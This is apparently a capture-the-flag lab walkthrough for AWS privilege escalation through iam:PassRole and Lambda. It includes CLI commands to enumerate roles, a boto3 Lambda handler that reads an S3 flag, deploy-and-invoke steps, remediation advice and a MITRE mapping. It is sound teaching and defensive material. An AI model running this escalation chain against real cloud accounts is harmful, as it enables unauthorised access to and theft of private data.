# IAM Privilege Escalation via PassRole + Lambda

**Difficulty:** Advanced | **Provider:** AWS | **Category:** IAM / Privilege Escalation

## Scenario

A developer IAM user was granted `iam:PassRole` scoped to a Lambda execution role that has
`s3:GetObject` on a private flag bucket. Combined with `lambda:CreateFunction` and
`lambda:InvokeFunction`, this is a well-known privilege escalation path: the attacker never
receives direct S3 access, but can create a Lambda function that runs **as** the privileged role
and exfiltrates the flag.

## Attack Path

```
[Attacker] dev-<id> (iam:PassRole + lambda:Create/Invoke)
    |
    v
aws iam list-roles  -->  find cumulonimbus-privesc-lambda-<id>
    |
    v
Write exploit Lambda (boto3 s3.get_object)
    |
    v
aws lambda create-function --role <privesc_role_arn> ...
    |
    v
aws lambda invoke --function-name exploit out.txt
    |
    v
cat out.txt  -->  flag
```

### Step 1 — Enumerate the privileged role

```bash
aws configure --profile attacker  # use the provided credentials, region eu-west-1
aws iam list-roles --profile attacker \
  --query "Roles[?contains(RoleName,'privesc')].Arn" --output text
```

### Step 2 — Write a Lambda exploit

```python
# lambda_function.py
import boto3, os

def handler(event, context):
    s3 = boto3.client("s3")
    bucket = os.environ["BUCKET"]
    obj = s3.get_object(Bucket=bucket, Key="flag.txt")
    return obj["Body"].read().decode()
```

### Step 3 — Package, deploy, and invoke

```bash
ROLE_ARN="<lambda_role_arn>"
BUCKET="<flag_bucket_name>"

zip lambda.zip lambda_function.py

aws lambda create-function \
  --function-name privesc-exploit \
  --runtime python3.9 \
  --role "${ROLE_ARN}" \
  --handler lambda_function.handler \
  --zip-file fileb://lambda.zip \
  --environment "Variables={BUCKET=${BUCKET}}" \
  --profile attacker

aws lambda invoke \
  --function-name privesc-exploit \
  out.txt \
  --profile attacker

cat out.txt
```

## How to Fix in Production

1. **Never grant `iam:PassRole` without tightly scoping the condition** — add a `iam:PassedToService` condition key and restrict the role ARN.
2. **Apply least-privilege to Lambda roles** — execution roles should only access the specific resources the function actually needs.
3. **Use IAM Access Analyzer** to detect privilege escalation paths automatically.
4. **Enable AWS CloudTrail** and alert on `lambda:CreateFunction` calls that reference high-privilege roles.
5. **Enforce SCP guardrails** at the Organizations level to prevent `iam:PassRole` to admin-equivalent roles.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Valid Accounts: Cloud Accounts | T1078.004 |
| Abuse Elevation Control Mechanism | T1548 |
| Data from Cloud Storage | T1530 |
| Cloud Infrastructure Discovery | T1580 |
